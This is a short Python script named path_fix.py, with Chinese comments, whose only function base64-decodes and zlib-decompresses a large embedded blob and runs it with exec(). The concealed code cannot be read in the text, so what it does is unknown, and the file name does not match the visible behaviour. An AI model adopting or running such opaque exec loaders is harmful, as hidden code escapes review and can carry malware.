#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
加密的Python文件 - path_fix.py
"""

import base64
import zlib
import sys
import types

def decrypt_and_run():
    """解密并执行代码"""
    # 加密的源代码
    encoded_source = """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"""
    
    try:
        # 解码和解压缩
        compressed = base64.b64decode(encoded_source.encode('ascii'))
        source_code = zlib.decompress(compressed).decode('utf-8')
        
        # 创建模块并执行
        module = types.ModuleType("__main__")
        exec(source_code, module.__dict__)
        
    except Exception as e:
        print(f"执行错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    decrypt_and_run()
